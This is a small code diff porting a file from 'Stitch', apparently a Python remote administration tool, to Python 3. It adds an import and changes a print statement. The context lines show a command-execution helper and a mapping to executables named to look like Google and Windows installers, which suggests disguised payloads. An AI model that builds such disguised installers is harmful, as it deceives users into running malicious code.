@@ -1,3 +1,4 @@
+import os
 #!/usr/bin/python
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
@@ -15,7 +16,7 @@ def run_command(command):
                 return subp_output
         return "[!] {}".format(errors)
     except KeyboardInterrupt:
-        print "Terminated command."
+        print("Terminated command.")
 
 nsis_exe = {'chrome':'Google Installer.exe',
         'drive' : 'Windows Drive Installer.exe',
